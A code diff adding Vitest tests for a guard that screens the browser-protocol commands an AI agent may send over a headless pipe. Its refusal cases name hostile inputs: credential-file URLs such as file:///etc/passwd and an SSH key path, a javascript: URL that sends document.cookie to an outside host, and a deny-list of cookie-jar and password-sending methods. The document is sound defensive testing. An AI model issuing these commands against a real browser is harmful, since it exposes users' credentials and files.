@@ -4,6 +4,8 @@ import { describe, expect, it } from 'vitest'
 import { cdpResourceType, cheapHeaders, RESOURCE_KINDS } from './browser-fetch-rules'
 import {
   ALLOWED_METHODS,
+  CDP_ALLOWED_METHODS,
+  CDP_DENIED_METHODS,
   DENIED_METHODS,
   isDrivableUrl,
   SCREENED_FULFIL_HEADERS,
@@ -452,5 +454,275 @@ describe('the baton is checked before the method', () => {
     const verdict = screenCommand({ state: 'human', method: 'Browser.close' })
     expect(verdict.ok).toBe(false)
     if (!verdict.ok) expect(verdict.reason).toContain('the person is using this page')
+  })
+})
+
+/*
+ * The second transport.
+ *
+ * Everything above screens the desktop channel — one `WebContents`, a tiny
+ * protocol, reads and screenshots done through Electron APIs rather than CDP.
+ * Below is the headless server, where the `--remote-debugging-pipe` is the only
+ * door and so the reads, the screenshot, the navigation and the target
+ * lifecycle all have to travel the protocol. `transport: 'cdp'` selects the
+ * second pair of tables; the default is `electron`, which is why every test
+ * above still describes the desktop unchanged.
+ */
+describe('the CDP tables screen the pipe transport', () => {
+  const DOWNLOADS = '/home/deck/.config/terminaldeck/downloads'
+
+  /**
+   * The arguments the argument-checked CDP methods need to pass.
+   *
+   * Being on the CDP allow-list is necessary and, for these, not sufficient —
+   * each carries a capability in its arguments and is refused without the right
+   * ones. Naming them here rather than loosening the loop keeps that visible.
+   */
+  const CDP_ARGUMENTS: Record<string, Record<string, unknown>> = {
+    'Fetch.enable': { patterns: [{ urlPattern: '*', resourceType: 'Image', requestStage: 'Request' }] },
+    'Fetch.fulfillRequest': { requestId: 'r1', responseCode: 200 },
+    'Page.navigate': { url: 'https://example.com/' },
+    'Runtime.evaluate': { contextId: 7 },
+    'Runtime.callFunctionOn': { executionContextId: 7 },
+    'Browser.setDownloadBehavior': { behavior: 'allowAndName', downloadPath: DOWNLOADS },
+    'Target.createTarget': { url: 'about:blank' },
+    'Network.getCookies': { urls: ['https://example.com/'] },
+  }
+
+  it('allows exactly the methods the server driver needs, given arguments it would send', () => {
+    for (const method of CDP_ALLOWED_METHODS) {
+      const verdict = screenCommand({
+        transport: 'cdp',
+        state: 'agent',
+        method,
+        params: CDP_ARGUMENTS[method] ?? {},
+        downloadsDir: DOWNLOADS,
+      })
+      expect(verdict.ok, `${method} was refused`).toBe(true)
+    }
+    // The reads the desktop does through Electron APIs, which the server must do
+    // over the wire, and the target lifecycle the DriveHost now owns.
+    expect(CDP_ALLOWED_METHODS).toContain('Runtime.evaluate')
+    expect(CDP_ALLOWED_METHODS).toContain('Page.captureScreenshot')
+    expect(CDP_ALLOWED_METHODS).toContain('Page.navigate')
+    expect(CDP_ALLOWED_METHODS).toContain('Target.createTarget')
+    // Everything the desktop channel sends is still allowed on the pipe.
+    for (const method of ALLOWED_METHODS) expect(CDP_ALLOWED_METHODS).toContain(method)
+  })
+
+  it.each(CDP_DENIED_METHODS)('refuses %s on the pipe transport', (method) => {
+    expect(screenCommand({ transport: 'cdp', state: 'agent', method }).ok).toBe(false)
+  })
+
+  it('still refuses the desktop dangers a server has no more right to', () => {
+    // Spelled out so deleting one from the CDP deny-list breaks a named test.
+    const denied = [
+      'Browser.close', // the instability he described, on either transport
+      'Network.getAllCookies', // the whole jar — the literal credentials
+      'Storage.getCookies', // the whole context jar
+      'Page.setDownloadBehavior', // the deprecated caller-named download door
+      'DOM.setFileInputFiles', // reads his disk into a website
+      'Browser.grantPermissions', // re-grants camera and microphone
+      'Network.setExtraHTTPHeaders', // composes what his session sends
+      'Fetch.continueWithAuth', // composes a password and sends it to a site
+      'Page.printToPDF', // writes a file
+      'Runtime.compileScript', // arbitrary script off the model's path
+      'Page.navigateToHistoryEntry', // no URL to screen; nothing drives it
+    ]
+    for (const method of denied) {
+      expect(CDP_DENIED_METHODS).toContain(method)
+      expect(screenCommand({ transport: 'cdp', state: 'agent', method }).ok).toBe(false)
+    }
+  })
+
+  it('keeps the CDP allow and deny tables disjoint', () => {
+    const overlap = CDP_ALLOWED_METHODS.filter((method) => CDP_DENIED_METHODS.includes(method))
+    expect(overlap).toEqual([])
+  })
+
+  it('refuses a method on neither CDP table, including ones nobody has heard of', () => {
+    for (const method of ['Console.enable', 'Accessibility.getFullAXTree', 'Nonsense.doThing', '']) {
+      expect(screenCommand({ transport: 'cdp', state: 'agent', method }).ok).toBe(false)
+    }
+  })
+
+  it('does not leak the server-only powers back onto the desktop', () => {
+    // The whole point of the axis: what the pipe may send, the WebContents may
+    // not. Both the default (electron) and the explicit spelling refuse them.
+    for (const method of [
+      'Runtime.evaluate',
+      'Page.captureScreenshot',
+      'Page.navigate',
+      'Target.createTarget',
+      'Browser.setDownloadBehavior',
+      'Network.getCookies',
+    ]) {
+      expect(screenCommand({ state: 'agent', method, params: {} }).ok).toBe(false)
+      expect(screenCommand({ transport: 'electron', state: 'agent', method, params: {} }).ok).toBe(false)
+    }
+  })
+
+  it('shuts the pipe entirely while the person has the page, reads included', () => {
+    for (const method of CDP_ALLOWED_METHODS) {
+      const verdict = screenCommand({ transport: 'cdp', state: 'human', method })
+      expect(verdict.ok).toBe(false)
+      if (!verdict.ok) expect(verdict.reason).toContain('the person is using this page')
+    }
+    // The screenshot read specifically: a capture taken while he types a
+    // password is the leak, so `human` refuses it on the pipe as on the desktop.
+    expect(screenCommand({ transport: 'cdp', state: 'human', method: 'Page.captureScreenshot' }).ok).toBe(false)
+  })
+})
+
+describe('navigation is the only door on the server, and it is screened there', () => {
+  /*
+   * On the desktop `Page.navigate` is refused by the allow-list before the URL
+   * check is ever reached — the driver navigates through `loadURL`. On the pipe
+   * there is no `loadURL`, so `Page.navigate` IS the door, and the same
+   * `isNavigationAllowed` guard that was dead code on the desktop becomes the
+   * whole of the `file://` protection here — a browser-initiated navigate walks
+   * past `will-navigate`, measured, so this is the only guard there is.
+   */
+  it.each([
+    'file:///etc/passwd',
+    'file:///Users/apple/.ssh/id_rsa',
+    'devtools://devtools/bundled/inspector.html',
+    'chrome://settings',
+    'javascript:fetch("https://x/"+document.cookie)',
+    'data:text/html,<script>1</script>',
+  ])('refuses Page.navigate to %s over the pipe', (url) => {
+    expect(screenCommand({ transport: 'cdp', state: 'agent', method: 'Page.navigate', params: { url } }).ok).toBe(false)
+  })
+
+  it('opens an ordinary http or https address over the pipe', () => {
+    expect(screenCommand({ transport: 'cdp', state: 'agent', method: 'Page.navigate', params: { url: 'https://example.com/' } }).ok).toBe(true)
+    expect(screenCommand({ transport: 'cdp', state: 'agent', method: 'Page.navigate', params: { url: 'http://localhost:3000/' } }).ok).toBe(true)
+  })
+
+  it('lets a target be reset to about:blank, which is what an empty view holds', () => {
+    expect(screenCommand({ transport: 'cdp', state: 'agent', method: 'Page.navigate', params: { url: 'about:blank' } }).ok).toBe(true)
+  })
+})
+
+describe('evaluation on the server never touches the main world', () => {
+  const cdp = { transport: 'cdp' as const, state: 'agent' as DriveState }
+
+  it('refuses Runtime.evaluate with no context, because that is the main world', () => {
+    const verdict = screenCommand({ ...cdp, method: 'Runtime.evaluate', params: { expression: '1+1' } })
+    expect(verdict.ok).toBe(false)
+    if (!verdict.ok) expect(verdict.reason).toContain('main world')
+  })
+
+  it('allows Runtime.evaluate inside a named isolated context', () => {
+    expect(screenCommand({ ...cdp, method: 'Runtime.evaluate', params: { expression: '1+1', contextId: 7 } }).ok).toBe(true)
+    expect(screenCommand({ ...cdp, method: 'Runtime.evaluate', params: { expression: '1+1', uniqueContextId: 'ctx-abc' } }).ok).toBe(true)
+  })
+
+  it('is not fooled by an objectId on an evaluate, which Chromium would ignore into the main world', () => {
+    // Runtime.evaluate does not accept objectId; passing it names no context, so
+    // the call would run in the main world and must be refused.
+    expect(screenCommand({ ...cdp, method: 'Runtime.evaluate', params: { expression: '1+1', objectId: 'obj-1' } }).ok).toBe(false)
+  })
+
+  it('allows Runtime.callFunctionOn on an object or an execution context', () => {
+    expect(screenCommand({ ...cdp, method: 'Runtime.callFunctionOn', params: { functionDeclaration: 'function(){}', objectId: 'obj-1' } }).ok).toBe(true)
+    expect(screenCommand({ ...cdp, method: 'Runtime.callFunctionOn', params: { functionDeclaration: 'function(){}', executionContextId: 7 } }).ok).toBe(true)
+    expect(screenCommand({ ...cdp, method: 'Runtime.callFunctionOn', params: { functionDeclaration: 'function(){}', uniqueContextId: 'ctx-abc' } }).ok).toBe(true)
+  })
+
+  it('refuses Runtime.callFunctionOn that names no context at all', () => {
+    expect(screenCommand({ ...cdp, method: 'Runtime.callFunctionOn', params: { functionDeclaration: 'function(){}' } }).ok).toBe(false)
+  })
+})
+
+describe('downloads on the server are pinned to the host directory', () => {
+  const DOWNLOADS = '/home/deck/.config/terminaldeck/downloads'
+  const cdp = { transport: 'cdp' as const, state: 'agent' as DriveState }
+
+  it('allows the host download behaviour written to the host directory', () => {
+    const verdict = screenCommand({
+      ...cdp,
+      method: 'Browser.setDownloadBehavior',
+      params: { behavior: 'allowAndName', downloadPath: DOWNLOADS },
+      downloadsDir: DOWNLOADS,
+    })
+    expect(verdict.ok).toBe(true)
+  })
+
+  it('refuses a download path the caller chose rather than the host', () => {
+    const verdict = screenCommand({
+      ...cdp,
+      method: 'Browser.setDownloadBehavior',
+      params: { behavior: 'allowAndName', downloadPath: '/etc' },
+      downloadsDir: DOWNLOADS,
+    })
+    expect(verdict.ok).toBe(false)
+    if (!verdict.ok) expect(verdict.reason).toContain('downloads directory')
+  })
+
+  it.each(['deny', 'default', 'allow'])('refuses the %s behaviour, since only allowAndName keeps the file', (behavior) => {
+    const verdict = screenCommand({
+      ...cdp,
+      method: 'Browser.setDownloadBehavior',
+      params: { behavior, downloadPath: DOWNLOADS },
+      downloadsDir: DOWNLOADS,
+    })
+    expect(verdict.ok).toBe(false)
+  })
+
+  it('refuses to pin a download when the host has no configured directory', () => {
+    const verdict = screenCommand({
+      ...cdp,
+      method: 'Browser.setDownloadBehavior',
+      params: { behavior: 'allowAndName', downloadPath: DOWNLOADS },
+    })
+    expect(verdict.ok).toBe(false)
+  })
+})
+
+describe('opening a target is screened like a navigation', () => {
+  const cdp = { transport: 'cdp' as const, state: 'agent' as DriveState }
+
+  it('opens a target at about:blank or an http(s) address', () => {
+    expect(screenCommand({ ...cdp, method: 'Target.createTarget', params: { url: 'about:blank' } }).ok).toBe(true)
+    expect(screenCommand({ ...cdp, method: 'Target.createTarget', params: { url: 'https://example.com/' } }).ok).toBe(true)
+  })
+
+  it.each([
+    'file:///etc/passwd',
+    'chrome://settings',
+    'javascript:alert(1)',
+    'data:text/html,<script>1</script>',
+  ])('refuses a target opened at %s', (url) => {
+    expect(screenCommand({ ...cdp, method: 'Target.createTarget', params: { url } }).ok).toBe(false)
+  })
+
+  it('refuses a target with no opening address at all', () => {
+    expect(screenCommand({ ...cdp, method: 'Target.createTarget', params: {} }).ok).toBe(false)
+  })
+})
+
+describe('the one cookie relaxation is scoped to a single URL', () => {
+  const cdp = { transport: 'cdp' as const, state: 'agent' as DriveState }
+
+  it('reads the cookies for exactly one http(s) URL', () => {
+    expect(screenCommand({ ...cdp, method: 'Network.getCookies', params: { urls: ['https://example.com/'] } }).ok).toBe(true)
+  })
+
+  it.each([
+    [{}],
+    [{ urls: [] }],
+    [{ urls: ['https://a.example/', 'https://b.example/'] }],
+    [{ urls: ['file:///etc/passwd'] }],
+    [{ urls: ['not a url'] }],
+  ])('refuses a cookie read that is not one http(s) URL: %o', (params) => {
+    expect(screenCommand({ ...cdp, method: 'Network.getCookies', params }).ok).toBe(false)
+  })
+
+  it('keeps the whole-jar and whole-context reads denied', () => {
+    expect(screenCommand({ ...cdp, method: 'Network.getAllCookies' }).ok).toBe(false)
+    expect(screenCommand({ ...cdp, method: 'Storage.getCookies' }).ok).toBe(false)
+    expect(CDP_DENIED_METHODS).toContain('Network.getAllCookies')
+    expect(CDP_DENIED_METHODS).toContain('Storage.getCookies')
   })
 })
